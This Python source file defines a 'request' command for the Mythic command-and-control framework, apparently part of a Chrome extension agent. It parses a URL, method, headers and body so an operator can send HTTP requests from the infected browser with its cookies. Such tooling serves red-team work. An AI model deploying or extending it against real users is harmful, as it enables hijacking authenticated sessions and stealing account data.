from mythic_container.MythicCommandBase import *


class RequestArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="url",
                type=ParameterType.String,
                description="Request URL",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=1)],
            ),
            CommandParameter(
                name="method",
                type=ParameterType.ChooseOne,
                choices=["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD"],
                default_value="GET",
                description="HTTP method",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=2)],
            ),
            CommandParameter(
                name="headers",
                type=ParameterType.String,
                description="JSON object of headers",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
            ),
            CommandParameter(
                name="body",
                type=ParameterType.String,
                description="Request body",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=4)],
            ),
        ]

    async def parse_arguments(self):
        if not self.command_line:
            raise ValueError("request requires url")
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
            return
        pieces = self.command_line.split(maxsplit=1)
        if pieces[0] in {"GET", "POST", "PUT", "DELETE", "PATCH", "HEAD"} and len(pieces) > 1:
            self.add_arg("method", pieces[0])
            self.add_arg("url", pieces[1])
        else:
            self.add_arg("url", self.command_line)

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class RequestCommand(CommandBase):
    cmd = "request"
    needs_admin = False
    help_cmd = "request -url https://example.com"
    description = "Send an HTTP request from the extension with browser cookies"
    version = 1
    author = "@PatchRequest"
    attackmapping = ["T1071.001"]
    argument_class = RequestArguments
    attributes = CommandAttributes(builtin=True, supported_os=[SupportedOS.Chrome])

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        method = taskData.args.get_arg("method") or "GET"
        url = taskData.args.get_arg("url")
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
            DisplayParams=f"{method} {url}",
        )

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
